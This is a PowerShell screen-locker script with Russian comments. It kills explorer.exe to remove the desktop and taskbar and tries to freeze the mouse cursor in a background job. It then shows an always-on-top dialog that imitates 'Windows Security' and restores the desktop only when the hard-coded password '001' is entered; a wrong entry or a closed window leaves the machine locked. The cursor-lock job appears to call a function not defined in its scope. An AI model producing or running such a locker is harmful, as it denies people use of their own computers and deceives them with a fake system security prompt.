# === АГРЕССИВНАЯ БЛОКИРОВКА ===
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName Microsoft.VisualBasic

# Убиваем explorer (desktop + панель задач)
Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue

$global:Blocked = $true
$global:Password = "001"

function Block-Input {
    while ($global:Blocked) {
        # Жёстко фиксируем курсор
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(50,50)
        Start-Sleep -Milliseconds 5
    }
}

# Запускаем блокировку мыши
$blockJob = Start-Job -ScriptBlock { Block-Input }

# Кастомное окно ввода (лучше работает с блокировкой)
$form = New-Object System.Windows.Forms.Form
$form.Text = "Windows Security - Компьютер заблокирован"
$form.Size = New-Object System.Drawing.Size(400,200)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.TopMost = $true

$label = New-Object System.Windows.Forms.Label
$label.Text = "Введите пароль для разблокировки:`n(только цифры)"
$label.Location = New-Object System.Drawing.Point(20,20)
$label.Size = New-Object System.Drawing.Size(340,50)
$form.Controls.Add($label)

$textbox = New-Object System.Windows.Forms.TextBox
$textbox.Location = New-Object System.Drawing.Point(20,80)
$textbox.Size = New-Object System.Drawing.Size(340,30)
$textbox.PasswordChar = '*'
$textbox.MaxLength = 10
$form.Controls.Add($textbox)

$okButton = New-Object System.Windows.Forms.Button
$okButton.Text = "OK"
$okButton.Location = New-Object System.Drawing.Point(140,130)
$okButton.Size = New-Object System.Drawing.Size(100,30)
$okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
$form.Controls.Add($okButton)

$form.AcceptButton = $okButton

# Показываем окно (блокировка активна)
$result = $form.ShowDialog()

if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
    $entered = $textbox.Text.Trim()
    
    if ($entered -eq $global:Password) {
        $global:Blocked = $false
        Stop-Job $blockJob
        Remove-Job $blockJob
        
        # Разблокируем desktop ТОЛЬКО после верного пароля
        Start-Process explorer.exe
        
        [System.Windows.Forms.MessageBox]::Show("Пароль верный. Доступ восстановлен.", "Разблокировано", "OK", "Information") | Out-Null
    } else {
        [System.Windows.Forms.MessageBox]::Show("Неверный пароль! Система остаётся заблокированной.", "Ошибка", "OK", "Error") | Out-Null
        # Блокировка продолжается, explorer не запускается
        # Можно добавить рекурсивный вызов для повторного окна
    }
} else {
    # Если закрыли окно — продолжаем блокировку
}
